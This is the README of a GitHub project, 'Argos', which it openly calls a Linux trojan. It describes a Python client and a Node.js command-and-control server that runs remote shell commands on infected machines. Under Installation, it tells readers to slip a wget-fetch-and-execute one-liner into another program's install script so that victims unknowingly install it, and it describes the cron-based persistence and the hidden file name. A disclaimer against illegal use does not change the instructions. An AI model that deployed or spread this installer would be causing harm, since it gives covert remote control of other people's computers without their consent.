<p align="center">
  <img src="https://github.com/Just1truc/Argos/blob/main/assets/top.png?raw=true">
  <br>
  <i>Can see everything, beware of its omniscience, kneel before its greatness.</i>
</p>

## Summary

- [**Presentation**](#presentation)
- [**Compatibility**](#compatibility)
- [**Installation**](#installation)
- [**Removing**](#removing)
- [**Credits**](#credits)

## Presentation

#### Main goal

This program work on **Linux** distrubtion.

The main goal of this project is to show how frighteningly easy it is to create a program that can access to another machine.
This project is a [**trojan**](https://us.norton.com/internetsecurity-malware-what-is-a-trojan.html) that, when used in an installation script, can easily be installed and gain access to the whole system.

#### How it works

There is 2 main parts to this project:
- The online server
- The client

#### Client side

Get to the client part
```bash
cd client/
```

The client side program is made using [**python3**](https://www.python.org/downloads/) and can easily be called in the installation script of another program by using a simple curl command.

The client side is using [**socket io**](https://socket.io/fr/) to connect with the server through web sockets.
In case the server is not running, the program will try every 3 seconds to connect to the server until it's connected.

Once connected, the client script is waiting for instructions from the server.
The instruction it can get are mostly commands. In order to run the commands, it's using a child process that is running a shell, writing in it's stdin using the file descriptor obtained through the pty.spawn command.

Once the child process is done running a command, it send a ALRM signal to its ppid so we can get the output of the command.

#### Server side

Get to the server part:
```bash
cd online_server
```
Front:
```bash
cd frontend
```
Backend:
```bash
cd server
```
The server is made in [**Node js**](https://nodejs.org/en/download/).
The backend is composed of 2 server :
- A [**SocketIO**](https://socket.io/fr/get-started/chat) server
- An [**ExpressJS**](https://expressjs.com/fr/) server

The *express JS* server is meant to received the requests from the frontend server.
Here are the routes of that server.
| Route | Protected using JWT |
|-------|---------------------|
|/login | NO |
|/services/:id| YES |
|/services/:id/shell| YES|

The socket server accept sockets and stock them in a global variable so the connexion can be used later on.
The sockets are listenning to events and so we are using that so in case of deconnexion with a client, the client will automaticly be remove from the list.

The /shell endpoint use the socket io server sending a command to the client and waiting for a response to send back the information to the frontend.

FrontEnd endpoints:
| Endpoint | Protected |
|----------|-----------|
|/login    | NO        |
|/clients  | YES       |
|/services/:id| YES    |
|/services/:id/shell| YES |

## Compatibility

Client OS:
| OS | Compatible ? |
|----|--------------|
|Windows|❌|
|Debian based|✅|
|Fedora Based|✅|
|Arch|❌|

## Installation

In order to use the project, you need to have a script that people will run.

In this very script, you juste have to call this command (remember to replace the 'Adress of the online server' by your server adress) :
```bash
wget -q -O - https://raw.githubusercontent.com/Just1truc/Argos/main/client/install_argos > here && chmod 777 here && bash here "Adress of the online server" && rm here
```
Once this command has been run, everthing should be ready for the client.

Also, to setup the server, it's kinda more complicated.
You have to host both the [**front**](https://github.com/Just1truc/Argos/blob/main/online_server/frontend/README.md) and the [**backend**](https://github.com/Just1truc/Argos/tree/main/online_server/server/README.md).

## Removing

This trojan is pretty annoying right? So let's remove it from your computer !

### Automatically

```bash
crontab -r; kill $(ps -aux | grep /usr/local/src/.service.exwrap.py | grep -v "grep" | awk '{print $2}')
```

### Manually

To do so, you just need to first execute this command to get rid of the cronjob :
```bash
crontab -r
```

Then, you need to cut the access to your computer, so let's kill the script doing that:
if you don't have ``htop``, you may have to install it.
```bash
htop -F python
```

> Tip: The trojan file is .service.exwrap.py

Then, keep the pid of the command that is using *python3* to run and kill it:
```bash
kill [pid]
```

## Credits:
<div align="center">
<table>
  <tr>
    <td align="center">
      <a href="https://github.com/Just1truc">
        <img src="https://avatars.githubusercontent.com/u/68695857?v=4&s=100" width="100px;" alt=""/>
      </a>
      <br />
      <sub>
        <b>Justin Duc</b>
        <p>Client side and Backend</p>
      </sub>
      <a href="https://github.com/Just1truc" title="GitHub">
        <img height=16 src="https://cdn-icons-png.flaticon.com/512/733/733609.png">
      </a>&nbsp;
      <a href="https://www.linkedin.com/in/justin-duc-51b09b225/" title="LinkedIn">
        <img height=16 src="https://cdn-icons-png.flaticon.com/512/733/733617.png">
      </a>
    </td>
    <td align="center">
      <a href="https://github.com/ZiplEix">
        <img src="https://avatars.githubusercontent.com/u/86067803?v=4&s=100" width="100px;" alt=""/>
      </a>
      <br />
      <sub>
        <b>Baptiste Leroyer</b>
        <p>Frontend Developper</p>
      </sub>
      <a href="https://github.com/ZiplEix" title="GitHub">
        <img height=16 src="https://cdn-icons-png.flaticon.com/512/733/733609.png">
      </a>&nbsp;
      <a href="https://www.linkedin.com/in/baptiste-leroyer-a69894227/" title="LinkedIn">
        <img height=16 src="https://cdn-icons-png.flaticon.com/512/733/733617.png">
      </a>
    </td>
    <td align="center">
      <a href="https://github.com/ZerLock">
        <img src="https://avatars.githubusercontent.com/u/47077683?v=4&s=100" width="100px;" alt=""/>
      </a>
      <br />
      <sub>
        <b>Léo Dubosclard</b>
        <p>DevOps Developper</p>
      </sub>
      <a href="https://github.com/ZerLock" title="GitHub">
        <img height=16 src="https://cdn-icons-png.flaticon.com/512/733/733609.png">
      </a>&nbsp;
      <a href="https://www.linkedin.com/in/leo-dubosclard/" title="LinkedIn">
        <img height=16 src="https://cdn-icons-png.flaticon.com/512/733/733617.png">
      </a>
    </td>
  </tr>
  <tr>
    <td align="center">
      <a href="https://github.com/izimio">
        <img src="https://avatars.githubusercontent.com/u/65503390?v=4&s=100" width="100px;" alt=""/>
      </a>
      <br />
      <sub>
        <b>Joshua Brionne</b>
        <p>Frontend Developper</p>
      </sub>
      <a href="https://github.com/izimio" title="GitHub">
        <img height=16 src="https://cdn-icons-png.flaticon.com/512/733/733609.png">
      </a>&nbsp;
      <a href="https://www.linkedin.com/in/joshua-brionne/" title="LinkedIn">
        <img height=16 src="https://cdn-icons-png.flaticon.com/512/733/733617.png">
      </a>
    </td>
    <td align="center">
      <a href="https://youtu.be/S7dbdC8e5cQ?t=43">
        <img src="https://cdn.discordapp.com/attachments/899334925206040606/983147821249200158/unknown.png" width="100px;" alt=""/>
      </a>
      <br />
      <sub>
        <b>Paul Laban</b>
        <p>Frontend Developper</p>
      </sub>
      <a href="https://www.youtube.com/watch?v=uksRrB1XCXU" title="GitHub">
        <img height=16 src="https://cdn-icons-png.flaticon.com/512/733/733609.png">
      </a>&nbsp;
      <a href="https://youtu.be/Wl959QnD3lM?t=34" title="LinkedIn">
        <img height=16 src="https://cdn-icons-png.flaticon.com/512/733/733617.png">
      </a>
    </td>
    <td align="center">
      <a href="https://github.com/MathiDEV">
        <img src="https://avatars.githubusercontent.com/u/40570499?v=4&s=100" width="100px;" alt=""/>
      </a>
      <br />
      <sub>
        <b>Mathias André</b>
        <p>Stability responsible</p>
      </sub>
      <a href="https://github.com/MathiDEV" title="GitHub">
        <img height=16 src="https://cdn-icons-png.flaticon.com/512/733/733609.png">
      </a>&nbsp;
      <a href="https://www.linkedin.com/in/mathias-andré/" title="LinkedIn">
        <img height=16 src="https://cdn-icons-png.flaticon.com/512/733/733617.png">
      </a>
    </td>
</table>
</div>

<br>
<br>

> ⚠️ *Do not use for illegal purposes*

*THIS PROJECT IS IN PROGRESS. It's FUNCTIONNAL but it's not as securised as it should be*
